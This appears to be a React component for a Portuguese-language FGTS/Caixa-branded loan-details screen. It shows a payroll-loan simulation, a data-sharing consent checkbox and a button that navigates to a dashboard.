
import React, { useState } from 'react';
import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal, Check, Info } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { Button } from '@/components/ui/button';
import { useNavigate } from 'react-router-dom';
import { useIsMobile } from '@/hooks/use-mobile';
import { Checkbox } from '@/components/ui/checkbox';

const LoanDetails = () => {
  const navigate = useNavigate();
  const isMobile = useIsMobile();
  const [termsAccepted, setTermsAccepted] = useState(false);
  
  const handleProceed = () => {
    // Here you would handle the loan application submission
    // For now, just go back to dashboard
    navigate('/dashboard');
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Detalhes do Empréstimo</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Confira as condições e confirme seu empréstimo
        </div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6">
          {/* Loan details */}
          <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
              <div>
                <div className="text-gray-500 text-sm">Valor do empréstimo</div>
                <div className="font-medium text-gray-900 text-xl">R$ 26.000,00</div>
              </div>
              <div>
                <div className="text-gray-500 text-sm">Parcelas</div>
                <div className="font-medium text-gray-900 text-xl">84x de R$ 859,90</div>
              </div>
            </div>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
              <div>
                <div className="text-gray-500 text-sm">Valor total a ser pago</div>
                <div className="font-medium text-gray-900 text-xl">R$ 72.231,60</div>
              </div>
              <div>
                <div className="text-gray-500 text-sm">Taxa de referência</div>
                <div className="font-medium text-blue-600 text-xl">3,04% ao mês</div>
              </div>
            </div>
            
            <div className="bg-blue-50 p-4 rounded-md mb-6 flex">
              <Info className="text-blue-700 mr-3 flex-shrink-0 mt-1" size={20} />
              <div className="text-blue-800 text-sm">
                Os valores desta simulação consideram a taxa média de juros do consignado privado, segundo o Bacen. As instituições podem oferecer condições ainda melhores. Solicite suas propostas!
              </div>
            </div>
            
            <div className="flex items-start space-x-3 mb-6">
              <Checkbox 
                id="terms" 
                checked={termsAccepted}
                onCheckedChange={() => setTermsAccepted(!termsAccepted)}
                className="mt-1"
              />
              <div>
                <label htmlFor="terms" className="text-gray-700 text-sm cursor-pointer">
                  Concordo em compartilhar meus dados trabalhistas e financeiros com as instituições financeiras parceiras.
                </label>
                <div className="mt-1">
                  <span className="text-blue-600 text-sm cursor-pointer">Quais dados serão compartilhados?</span>
                </div>
              </div>
            </div>
            
            <Button 
              className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full"
              onClick={handleProceed}
              disabled={!termsAccepted}
            >
              CONTRATAR EMPRÉSTIMO
            </Button>
          </div>
          
          {/* Benefits */}
          <div className="mb-20">
            <div className="text-[#005CA9] font-semibold mb-3">Vantagens</div>
            <div className="flex items-start space-x-2 mb-2">
              <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
              <span className="text-sm text-gray-600">Crédito fácil e rápido</span>
            </div>
            <div className="flex items-start space-x-2 mb-2">
              <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
              <span className="text-sm text-gray-600">Sem consulta ao SPC/Serasa</span>
            </div>
            <div className="flex items-start space-x-2">
              <Check size={16} className="text-green-500 mt-0.5 flex-shrink-0" />
              <span className="text-sm text-gray-600">Dinheiro na conta em até 24 horas</span>
            </div>
          </div>
        </div>
        
        {/* Bottom Navigation */}
        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanDetails;
